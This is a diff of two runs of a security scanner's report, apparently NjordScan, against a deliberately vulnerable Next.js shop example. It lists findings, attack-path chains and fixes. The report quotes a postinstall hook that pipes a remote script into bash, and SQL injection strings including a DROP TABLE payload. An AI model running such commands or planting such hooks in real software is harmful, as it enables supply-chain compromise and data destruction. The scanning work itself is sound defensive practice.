@@ -1,1004 +1,729 @@
 
-🛡  NjordScan  ·  nextjs  ·  7 files  ·  0.18s
+🛡  NjordScan  ·  nextjs  ·  7 files  ·  0.15s
 /home/megatron/Coding/NjordScan/examples/vulnerable-shop
 ╭────── Summary ───────╮
 │  Severity     Count  │
 │  🔴 Critical      3  │
-│  🟠 High         10  │
-│  🟡 Medium       14  │
-│  🔵 Low           3  │
-│  Total           30  │
+│  🟠 High          8  │
+│  🟡 Medium        5  │
+│  🔵 Low           2  │
+│  Total           18  │
 ╰──────────────────────╯
 
-╭─  1. 🔴 [CRITICAL] AWS access key committed to the repository ─────────────────────────────────╮
-│                                                                                                │
-│  .env.local:2                                                                                  │
-│  CWE-798  ·  A07:2021-Identification and Authentication Failures  ·  ATT&CK T1552.001  ·       │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  Looks like a AWS Access Key ID.                                                               │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    AWS_…****=AKIA…****                                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  An AWS access key pair grants programmatic access to your cloud account. Committed AWS keys   │
-│  are scraped automatically and can be used to spin up servers (huge bills) or read your data   │
-│  within minutes of being pushed.                                                               │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Deactivate and delete this key in the AWS IAM console immediately, then issue a new one and   │
-│  store it in your host's secret manager / environment — never in code.                         │
-│    // load from process.env at runtime; configure via AWS IAM roles where possible             │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html                     │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+🎯 Attack paths  ·  how these issues chain into a real breach
+These are the routes an attacker can actually walk. Fix the ★ step in each — it collapses the whole 
+chain.
 
-╭─  2. 🔴 [CRITICAL] SQL query built by glueing strings together ────────────────────────────────╮
-│                                                                                                │
-│  lib/db.ts:7                                                                                   │
-│  CWE-89  ·  A03:2021-Injection  ·  ATT&CK T1190  ·  confidence: high                           │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/products/route.ts                                     │
-│                                                                                                │
-│  SQL query is concatenated with a variable — a user can inject their own SQL. Use a            │
-│  parameterized query with ? / $1 placeholders.                                                 │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    return client.query('SELECT * FROM products WHERE name LIKE %' + term + '%');               │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  When you build a SQL query by adding (`+`) a variable into the query                          │
-│  string, the database can't tell your query apart from data the user typed.                    │
-│  If that variable came from a form, a URL, or an API request, an attacker can                  │
-│  type SQL of their own — for example ending your query early and adding                        │
-│  `OR 1=1 --` to dump every row, or `; DROP TABLE users; --` to delete data.                    │
-│  This is the classic "SQL injection" bug, and it can leak or destroy your                      │
-│  entire database.                                                                              │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Never put user data directly into the query text. Use a parameterized query                   │
-│  (also called a "prepared statement"): write `?` or `$1` placeholders and                      │
-│  pass the values as a separate array. The database driver then treats them as                  │
-│  pure data that can never become SQL. If you use an ORM (Prisma, Drizzle,                      │
-│  Sequelize), use its query builder instead of raw string SQL.                                  │
-│    // instead of: db.query('SELECT * FROM users WHERE id = ' + id)                             │
-│    db.query('SELECT * FROM users WHERE id = ?', [id]); // value is sent separately             │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://owasp.org/www-community/attacks/SQL_Injection                                    │
-│     •                                                                                          │
-│  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html      │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  path-1  Cloud/account pivot: server access → harvested secret ─────────────────────────────────╮
+│                                                                                                  │
+│  🔴 score 100 · critical                                                                         │
+│  Impact: Compromise of external systems the leaked credential unlocks                            │
+│                                                                                                  │
+│  ★ 1. [Execution] Server-side code/query execution                                               │
+│       lib/db.ts:7                                                                                │
+│       SQL query built by glueing strings together (lib/db.ts:7) can run code or queries on the   │
+│  server.                                                                                         │
+│                                                                                                  │
+│    2. [Credential Access] A real secret is sitting right there                                   │
+│       .env.local:2                                                                               │
+│       AWS access key committed to the repository (.env.local:2) puts a live credential within    │
+│  reach of that primitive.                                                                        │
+│                                                                                                  │
+│    3. [Lateral Movement] Pivot beyond the app with stolen keys                                   │
+│       .env.local:2                                                                               │
+│       With the secret in hand, the attacker authenticates to your cloud / database /             │
+│  third-party services — the blast radius now extends past this app.                              │
+│                                                                                                  │
+│  🛠  Break the chain at step 1 — parameterise the query / stop running attacker-controlled input  │
+│  (lib/db.ts:7). Fixing that one thing stops this whole path.                                     │
+│                                                                                                  │
+│  Why this scores 100: critical finding (sqli.string-concatenation); server-side reachable from   │
+│  an entrypoint; chain reaches a concrete impact (data/system compromise); exposes a credential   │
+│  — blast radius beyond this app; 2 distinct weaknesses align into one chain; every step is       │
+│  high-confidence.                                                                                │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  3. 🔴 [CRITICAL] Dangerous install lifecycle script in package.json ─────────────────────────╮
-│                                                                                                │
-│  package.json:8                                                                                │
-│  CWE-506  ·  A08:2021-Software and Data Integrity Failures  ·  ATT&CK T1195.002  ·             │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  Lifecycle script 'postinstall': Pipes remote content directly into a shell/interpreter.       │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "postinstall": "curl -s https://setup.example.com/init.sh | bash"                           │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  `preinstall`/`postinstall` scripts run automatically on `npm install`, with your user's       │
-│  permissions. A script that pipes a remote file into a shell (curl | sh), opens a reverse      │
-│  shell, or reads credentials is a classic supply-chain attack — it runs before you ever start  │
-│  your app.                                                                                     │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Review the script and the package that ships it. Install untrusted packages with `npm         │
-│  install --ignore-scripts`. Remove any install script that fetches and executes remote code.   │
-│    npm install --ignore-scripts   # then run only the build steps you trust                    │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://docs.npmjs.com/cli/v10/using-npm/scripts#best-practices                          │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  path-2  Build/CI compromise via a malicious dependency ────────────────────────────────────────╮
+│                                                                                                  │
+│  🔴 score 86 · critical                                                                          │
+│  Impact: Code execution on your build server, CI, or developers' machines                        │
+│                                                                                                  │
+│  ★ 1. [Initial Access] Malicious code arrives via a dependency                                   │
+│       package.json:8                                                                             │
+│       Dangerous install lifecycle script in package.json (package.json:8) — Lifecycle script     │
+│  'postinstall': Pipes remote content directly into a shell/interpreter.                          │
+│                                                                                                  │
+│    2. [Execution] It runs at install time, before your app starts                                │
+│       package.json:8                                                                             │
+│       npm runs lifecycle scripts on `npm install` / CI — this executes on your build server or   │
+│  developer machine with no app code involved.                                                    │
+│                                                                                                  │
+│  🛠  Break the chain at step 1 — remove or pin this dependency and audit the script               │
+│  (package.json:8). Fixing that one thing stops this whole path.                                  │
+│                                                                                                  │
+│  Why this scores 86: critical finding (supply-chain.dangerous-install-script); server-side       │
+│  reachable from an entrypoint; chain reaches a concrete impact (data/system compromise).         │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  4. 🟠 [HIGH] Hard-coded secret or credential ────────────────────────────────────────────────╮
-│                                                                                                │
-│  .env.local:3                                                                                  │
-│  CWE-798  ·  A07:2021-Identification and Authentication Failures  ·  ATT&CK T1552.001  ·       │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  Looks like a Database URL with credentials.                                                   │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    DATA…****=postgres://sh…****:Pr0d…****@db.internal:5432/shop                                │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  A secret committed to your code (API key, password, token) is visible to anyone who can see   │
-│  the repository — and stays in git history forever, even if you delete the line later. Leaked  │
-│  keys are routinely scraped from public repos within minutes and used to run up bills or       │
-│  steal data.                                                                                   │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Move the value to an environment variable, add the env file to .gitignore, and ROTATE the     │
-│  exposed secret now (assume it is already compromised). On Next.js, only expose values to the  │
-│  browser via the NEXT_PUBLIC_ prefix when you intend them to be public.                        │
-│    const apiKey = process.env.API_KEY; // set in your host's env / .env.local (gitignored)     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html       │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  path-3  Injection via untrusted input → paint() -> el.innerHTML [in lib/render.ts] ────────────╮
+│                                                                                                  │
+│  🟠 score 74 · high                                                                              │
+│  Impact: Server-side code/query execution                                                        │
+│                                                                                                  │
+│    1. [Initial Access] Attacker controls untrusted input                                         │
+│       app/api/products/route.ts:5                                                                │
+│       An attacker supplies a value via `req.body` (app/api/products/route.ts:5) reaching         │
+│  app/api/products/route.ts. Nothing about this input is trusted.                                 │
+│                                                                                                  │
+│  ★ 2. [Execution] Untrusted input reaches a dangerous sink                                       │
+│       app/api/products/route.ts:10                                                               │
+│       That value flows unsanitised into `paint() -> el.innerHTML [in lib/render.ts]`             │
+│  (app/api/products/route.ts:10) — the attacker now controls what the server runs.                │
+│                                                                                                  │
+│  🛠  Break the chain at step 2 — validate or parameterise the value at the sink                   │
+│  (app/api/products/route.ts:10). Fixing that one thing stops this whole path.                    │
+│                                                                                                  │
+│  Why this scores 74: high finding (xss.inner-html); server-side reachable from an entrypoint;    │
+│  chain reaches a concrete impact (data/system compromise).                                       │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  5. 🟠 [HIGH] Secret exposed to the browser via NEXT_PUBLIC_ / VITE_ ─────────────────────────╮
-│                                                                                                │
-│  .env.local:5                                                                                  │
-│  CWE-200  ·  A01:2021-Broken Access Control  ·  ATT&CK T1552  ·  confidence: medium            │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  `NEXT_PUBLIC_INTERNAL_API_TOKEN` is exposed to the browser bundle.                            │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    NEXT…****=tkn_…****                                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Variables prefixed with NEXT_PUBLIC_ (Next.js) or VITE_ (Vite) are inlined into the           │
-│  JavaScript bundle that ships to every visitor. Putting a real secret (private API key, DB     │
-│  password) behind that prefix publishes it to the whole world.                                 │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Only use the public prefix for values that are safe to be public. Keep real secrets           │
-│  unprefixed and read them only in server code (Route Handlers, Server Actions,                 │
-│  getServerSideProps).                                                                          │
-│    // server only:                                                                             │
-│    const key = process.env.STRIPE_SECRET_KEY; // NOT NEXT_PUBLIC_                              │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://nextjs.org/docs/app/building-your-application/configuring/environment-variables  │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  path-4  Exploitation of lodash via CVE-2021-23337 ─────────────────────────────────────────────╮
+│                                                                                                  │
+│  🟡 score 58 · medium                                                                            │
+│  Impact: Compromise via a publicly-known dependency exploit                                      │
+│                                                                                                  │
+│  ★ 1. [Initial Access] Exposed dependency with a public exploit                                  │
+│       package.json:14                                                                            │
+│       You ship `lodash` affected by CVE-2021-23337, reachable from code you actually call.       │
+│                                                                                                  │
+│    2. [Execution] Attacker triggers the known vulnerability                                      │
+│       package.json:14                                                                            │
+│       Public exploit code exists; the attacker runs it against your deployment.                  │
+│                                                                                                  │
+│  🛠  Break the chain at step 1 — upgrade lodash to 4.17.21 (package.json:14). Fixing that one     │
+│  thing stops this whole path.                                                                    │
+│                                                                                                  │
+│  Why this scores 58: high finding (deps.known-vulnerability); chain reaches a concrete impact    │
+│  (data/system compromise).                                                                       │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  6. 🟠 [HIGH] AI route calls the model with no sign-in / auth check in the file ──────────────╮
-│                                                                                                │
-│  app/api/chat/route.ts:1                                                                       │
-│  CWE-770  ·  A04:2021-Insecure Design  ·  ATT&CK T1190, T1496  ·  confidence: medium           │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/chat/route.ts                                         │
-│                                                                                                │
-│  This AI route calls the model but the file has no sign-in/auth check — anyone can hit it and  │
-│  run up your AI bill (denial of wallet). Require a logged-in user before the model call.       │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    import OpenAI from 'openai';                                                                │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This route handler calls a paid AI model (OpenAI / Anthropic / etc.) but                      │
-│  nothing in the file checks who is calling it — no session, no login, no API                   │
-│  token. That means ANYONE on the internet who finds the URL can hit it as                      │
-│  many times as they like. Every call costs you money, so a bot can run up a                    │
-│  huge bill on your account overnight ("denial of wallet"), and your model                      │
-│  quota gets drained for real users. It also lets strangers use your app as a                   │
-│  free LLM proxy. (This is a heuristic: if your auth check lives in middleware                  │
-│  or a shared helper this file doesn't reference, you can add a                                 │
-│  `// njordscan-ignore` comment on the call line.)                                              │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Before calling the model, confirm the request is from a logged-in user and                    │
-│  reject it otherwise. Use whatever auth you already have: `getServerSession`                   │
-│  (NextAuth), `auth()` (Clerk), `supabase.auth.getUser()`, or a check on the                    │
-│  `Authorization` header / API key for server-to-server calls. Return 401 if                    │
-│  the check fails — do this first, before any model call.                                       │
-│    import { getServerSession } from 'next-auth';                                               │
-│    export async function POST(req) {                                                           │
-│      const session = await getServerSession();                                                 │
-│      if (!session) return new Response('Unauthorized', { status: 401 });                       │
-│      const completion = await openai.chat.completions.create({                                 │
-│        model: 'gpt-4o-mini', max_tokens: 500, messages,                                        │
-│      });                                                                                       │
-│      return Response.json(completion);                                                         │
-│    }                                                                                           │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://owasp.org/www-project-top-10-for-large-language-model-applications/              │
-│     • https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  1. 🔴 [CRITICAL] AWS access key committed to the repository ───────────────────────────────────╮
+│                                                                                                  │
+│  .env.local:2                                                                                    │
+│  CWE-798  ·  A07:2021-Identification and Authentication Failures  ·  ATT&CK T1552.001  ·         │
+│  confidence: high                                                                                │
+│                                                                                                  │
+│  🎯 Reachable                                                                                    │
+│                                                                                                  │
+│  Looks like a AWS Access Key ID.                                                                 │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    AWS_…****=AKIA…****                                                                           │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  An AWS access key pair grants programmatic access to your cloud account. Committed AWS keys     │
+│  are scraped automatically and can be used to spin up servers (huge bills) or read your data     │
+│  within minutes of being pushed.                                                                 │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Deactivate and delete this key in the AWS IAM console immediately, then issue a new one and     │
+│  store it in your host's secret manager / environment — never in code.                           │
+│    // load from process.env at runtime; configure via AWS IAM roles where possible               │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html                       │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  7. 🟠 [HIGH] User input assigned to innerHTML / outerHTML ───────────────────────────────────╮
-│                                                                                                │
-│  app/api/chat/route.ts:14                                                                      │
-│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: medium                     │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/chat/route.ts                                         │
-│                                                                                                │
-│  innerHTML assigned a non-literal value; renders as HTML and can execute injected scripts if   │
-│  user-controlled.                                                                              │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    document.getElementById('a').innerHTML = answer; // LLM output rendered as HTML (XSS)       │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data    │
-│  an attacker controls, they can inject markup that runs JavaScript in your users' browsers     │
-│  (cross-site scripting), letting them hijack accounts or steal data.                           │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React,     │
-│  render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with     │
-│  DOMPurify first.                                                                              │
-│    element.textContent = userInput; // rendered as text, never executed                        │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://owasp.org/www-community/attacks/xss/                                             │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  2. 🔴 [CRITICAL] SQL query built by glueing strings together ──────────────────────────────────╮
+│                                                                                                  │
+│  lib/db.ts:7                                                                                     │
+│  CWE-89  ·  A03:2021-Injection  ·  ATT&CK T1190  ·  confidence: high                             │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/products/route.ts                                       │
+│                                                                                                  │
+│  SQL query is concatenated with a variable — a user can inject their own SQL. Use a              │
+│  parameterized query with ? / $1 placeholders.                                                   │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    return client.query('SELECT * FROM products WHERE name LIKE %' + term + '%');                 │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  When you build a SQL query by adding (`+`) a variable into the query                            │
+│  string, the database can't tell your query apart from data the user typed.                      │
+│  If that variable came from a form, a URL, or an API request, an attacker can                    │
+│  type SQL of their own — for example ending your query early and adding                          │
+│  `OR 1=1 --` to dump every row, or `; DROP TABLE users; --` to delete data.                      │
+│  This is the classic "SQL injection" bug, and it can leak or destroy your                        │
+│  entire database.                                                                                │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Never put user data directly into the query text. Use a parameterized query                     │
+│  (also called a "prepared statement"): write `?` or `$1` placeholders and                        │
+│  pass the values as a separate array. The database driver then treats them as                    │
+│  pure data that can never become SQL. If you use an ORM (Prisma, Drizzle,                        │
+│  Sequelize), use its query builder instead of raw string SQL.                                    │
+│    // instead of: db.query('SELECT * FROM users WHERE id = ' + id)                               │
+│    db.query('SELECT * FROM users WHERE id = ?', [id]); // value is sent separately               │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://owasp.org/www-community/attacks/SQL_Injection                                      │
+│     • https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html   │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  8. 🟠 [HIGH] User input assigned to innerHTML / outerHTML ───────────────────────────────────╮
-│                                                                                                │
-│  app/api/products/route.ts:10                                                                  │
-│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: high                       │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/products/route.ts                                     │
-│                                                                                                │
-│  User input from `req.body` flows into paint() -> el.innerHTML [in lib/render.ts].             │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    paint(el, body.labelHtml);                                                                  │
-│                                                                                                │
-│  Data flow (untrusted input → dangerous use):                                                  │
-│          source: req.body (app/api/products/route.ts:5)                                        │
-│     ↓                                                                                          │
-│     propagation: paint() in lib/render.ts (param 1 -> el.innerHTML) (lib/render.ts:10)         │
-│     ↓                                                                                          │
-│            sink: paint() -> el.innerHTML [in lib/render.ts] (app/api/products/route.ts:10)     │
-│                                                                                                │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data    │
-│  an attacker controls, they can inject markup that runs JavaScript in your users' browsers     │
-│  (cross-site scripting), letting them hijack accounts or steal data.                           │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React,     │
-│  render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with     │
-│  DOMPurify first.                                                                              │
-│    element.textContent = userInput; // rendered as text, never executed                        │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://owasp.org/www-community/attacks/xss/                                             │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  3. 🔴 [CRITICAL] Dangerous install lifecycle script in package.json ───────────────────────────╮
+│                                                                                                  │
+│  package.json:8                                                                                  │
+│  CWE-506  ·  A08:2021-Software and Data Integrity Failures  ·  ATT&CK T1195.002  ·  confidence:  │
+│  high                                                                                            │
+│                                                                                                  │
+│  🎯 Reachable                                                                                    │
+│                                                                                                  │
+│  Lifecycle script 'postinstall': Pipes remote content directly into a shell/interpreter.         │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    "postinstall": "curl -s https://setup.example.com/init.sh | bash"                             │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  `preinstall`/`postinstall` scripts run automatically on `npm install`, with your user's         │
+│  permissions. A script that pipes a remote file into a shell (curl | sh), opens a reverse        │
+│  shell, or reads credentials is a classic supply-chain attack — it runs before you ever start    │
+│  your app.                                                                                       │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Review the script and the package that ships it. Install untrusted packages with `npm install   │
+│  --ignore-scripts`. Remove any install script that fetches and executes remote code.             │
+│    npm install --ignore-scripts   # then run only the build steps you trust                      │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://docs.npmjs.com/cli/v10/using-npm/scripts#best-practices                            │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  9. 🟠 [HIGH] User input assigned to innerHTML / outerHTML ───────────────────────────────────╮
-│                                                                                                │
-│  lib/render.ts:3                                                                               │
-│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: medium                     │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/products/route.ts                                     │
-│                                                                                                │
-│  innerHTML assigned a non-literal value; renders as HTML and can execute injected scripts if   │
-│  user-controlled.                                                                              │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    el.innerHTML = html;                                                                        │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data    │
-│  an attacker controls, they can inject markup that runs JavaScript in your users' browsers     │
-│  (cross-site scripting), letting them hijack accounts or steal data.                           │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React,     │
-│  render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with     │
-│  DOMPurify first.                                                                              │
-│    element.textContent = userInput; // rendered as text, never executed                        │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://owasp.org/www-community/attacks/xss/                                             │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  4. 🟠 [HIGH] Hard-coded secret or credential ──────────────────────────────────────────────────╮
+│                                                                                                  │
+│  .env.local:3                                                                                    │
+│  CWE-798  ·  A07:2021-Identification and Authentication Failures  ·  ATT&CK T1552.001  ·         │
+│  confidence: high                                                                                │
+│                                                                                                  │
+│  🎯 Reachable                                                                                    │
+│                                                                                                  │
+│  Looks like a Database URL with credentials.                                                     │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    DATA…****=postgres://sh…****:Pr0d…****@db.internal:5432/shop                                  │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  A secret committed to your code (API key, password, token) is visible to anyone who can see     │
+│  the repository — and stays in git history forever, even if you delete the line later. Leaked    │
+│  keys are routinely scraped from public repos within minutes and used to run up bills or steal   │
+│  data.                                                                                           │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Move the value to an environment variable, add the env file to .gitignore, and ROTATE the       │
+│  exposed secret now (assume it is already compromised). On Next.js, only expose values to the    │
+│  browser via the NEXT_PUBLIC_ prefix when you intend them to be public.                          │
+│    const apiKey = process.env.API_KEY; // set in your host's env / .env.local (gitignored)       │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html         │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  10. 🟠 [HIGH] Dependency with a known security vulnerability ────────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2024-51479 (vulnerable >=9.5.5,<14.2.15). Upgrade to 14.2.15   │
-│  or later. (EPSS 79% 30-day exploit probability) 🎯 `next` is imported and used in your code.  │
-│  Next.js authorization bypass vulnerability                                                    │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2024-51479                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  5. 🟠 [HIGH] Secret exposed to the browser via NEXT_PUBLIC_ / VITE_ ───────────────────────────╮
+│                                                                                                  │
+│  .env.local:5                                                                                    │
+│  CWE-200  ·  A01:2021-Broken Access Control  ·  ATT&CK T1552  ·  confidence: medium              │
+│                                                                                                  │
+│  🎯 Reachable                                                                                    │
+│                                                                                                  │
+│  `NEXT_PUBLIC_INTERNAL_API_TOKEN` is exposed to the browser bundle.                              │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    NEXT…****=tkn_…****                                                                           │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Variables prefixed with NEXT_PUBLIC_ (Next.js) or VITE_ (Vite) are inlined into the JavaScript  │
+│  bundle that ships to every visitor. Putting a real secret (private API key, DB password)        │
+│  behind that prefix publishes it to the whole world.                                             │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Only use the public prefix for values that are safe to be public. Keep real secrets unprefixed  │
+│  and read them only in server code (Route Handlers, Server Actions, getServerSideProps).         │
+│    // server only:                                                                               │
+│    const key = process.env.STRIPE_SECRET_KEY; // NOT NEXT_PUBLIC_                                │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://nextjs.org/docs/app/building-your-application/configuring/environment-variables    │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  11. 🟠 [HIGH] Dependency with a known security vulnerability ────────────────────────────────╮
-│                                                                                                │
-│  package.json:14                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  lodash@4.17.15 is affected by CVE-2021-23337 (vulnerable <4.17.21). Upgrade to 4.17.21 or     │
-│  later. (EPSS 4% 30-day exploit probability) 🎯 Reachable: your code calls the vulnerable      │
-│  `template` from `lodash`. Command injection in lodash via the template function: untrusted    │
-│  templates/options can execute arbitrary code.                                                 │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "lodash": "4.17.15"  // CVE-2021-23337                                                      │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  6. 🟠 [HIGH] AI route calls the model with no sign-in / auth check in the file ────────────────╮
+│                                                                                                  │
+│  app/api/chat/route.ts:1                                                                         │
+│  CWE-770  ·  A04:2021-Insecure Design  ·  ATT&CK T1190, T1496  ·  confidence: medium             │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/chat/route.ts                                           │
+│                                                                                                  │
+│  This AI route calls the model but the file has no sign-in/auth check — anyone can hit it and    │
+│  run up your AI bill (denial of wallet). Require a logged-in user before the model call.         │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    import OpenAI from 'openai';                                                                  │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
